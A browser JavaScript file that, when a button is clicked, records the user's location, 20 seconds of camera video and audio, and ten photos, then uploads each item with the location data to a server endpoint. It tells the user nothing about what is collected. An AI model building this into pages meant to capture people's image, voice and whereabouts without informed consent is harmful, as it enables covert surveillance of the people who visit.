const startBtn = document.getElementById("startBtn");
const preview = document.getElementById("preview");

let metadata = {};

async function getUserLocation() {
    return new Promise(resolve => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => {
                    metadata.latitude = pos.coords.latitude;
                    metadata.longitude = pos.coords.longitude;
                    metadata.timestamp = new Date().toISOString();
                    resolve();
                },
                err => {
                    metadata.latitude = 'Unavailable';
                    metadata.longitude = 'Unavailable';
                    metadata.timestamp = new Date().toISOString();
                    resolve();
                }
            );
        } else {
            metadata.latitude = 'Unsupported';
            metadata.longitude = 'Unsupported';
            metadata.timestamp = new Date().toISOString();
            resolve();
        }
    });
}

async function sendFile(blob, filename) {
    const formData = new FormData();
    formData.append("file", blob, filename);
    formData.append("meta", JSON.stringify(metadata));

    try {
        await fetch("/upload", {
            method: "POST",
            body: formData
        });
    } catch (err) {
        console.error("Failed to send file:", filename, err);
    }
}

startBtn.onclick = async () => {
    startBtn.disabled = true;
    startBtn.textContent = "Capturing...";

    await getUserLocation();

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        preview.srcObject = stream;

        await new Promise(resolve => {
            preview.onloadeddata = () => resolve();
        });

        // Step 1: Record 20-second video
        const mediaRecorder = new MediaRecorder(stream);
        const videoChunks = [];

        mediaRecorder.ondataavailable = e => videoChunks.push(e.data);
        mediaRecorder.onstop = async () => {
            const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
            await sendFile(videoBlob, "recorded_video.webm");

            // Step 2: Take 10 photos using ImageCapture API
            const [videoTrack] = stream.getVideoTracks();
            const imageCapture = new ImageCapture(videoTrack);

            for (let i = 0; i < 10; i++) {
                try {
                    const photoBlob = await imageCapture.takePhoto();
                    await sendFile(photoBlob, `photo_${i + 1}.jpg`);
                } catch (error) {
                    console.error(`Photo ${i + 1} failed:`, error);
                }

                await new Promise(res => setTimeout(res, 2000)); // wait 2s between photos
            }

            stream.getTracks().forEach(track => track.stop());
            startBtn.textContent = "Done ✔";
        };

        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 20000); // record for 20 seconds

    } catch (err) {
        console.error("Camera access failed:", err);
        startBtn.textContent = "Permission Denied";
    }
};
